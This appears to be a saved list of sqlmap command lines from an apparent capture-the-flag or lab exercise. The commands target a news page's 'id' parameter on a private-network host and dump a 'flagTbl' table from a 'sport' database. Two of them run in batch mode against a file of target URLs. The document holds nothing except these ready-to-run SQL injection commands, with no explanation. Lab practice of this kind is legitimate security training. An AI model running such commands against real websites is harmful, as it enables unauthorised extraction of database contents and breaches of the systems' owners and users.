python sqlmap.py -u "http://192.168.100.101:48180/sport/news_show.php?id=1"  -D sport -T flagTbl --dump-all
python sqlmap.py -u "http://192.168.100.101:48180/sport/news_show.php?id=1"  -D sport -T flagTbl --dump-all
python sqlmap.py -u "http://192.168.100.101:48180/sport/news_show.php?id=1"  -D sport -T flagTbl --dump -C flag
python sqlmap.py -D sport -T flagTbl --dump -C flag --purge --batch --dbms "MySQL" -m "C:\Users\twc\Desktop\urls.txt"
python sqlmap.py -D sport -T flagTbl --dump -C flag --purge --batch --dbms "MySQL" -m ".\urls.txt"